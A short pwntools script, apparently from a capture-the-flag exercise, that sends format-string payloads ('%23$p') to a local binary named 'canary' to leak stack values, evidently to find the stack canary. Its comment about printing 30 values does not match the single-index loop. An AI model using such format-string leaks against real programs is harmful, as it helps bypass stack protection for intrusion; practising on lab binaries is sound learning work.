from pwn import *

elf = context.binary = ELF("./canary", checksec=False)

# print first 30 values (can be increased)
for i in range(23,24):
    try:
        p = process(level="error")
        p.sendline(f"%{i}$p".encode())
        p.recvline()
        result = p.recvline().decode()
        # adds index
        if result:
            print(f"{i}: {result.strip()}")
    except EOFError:
        pass
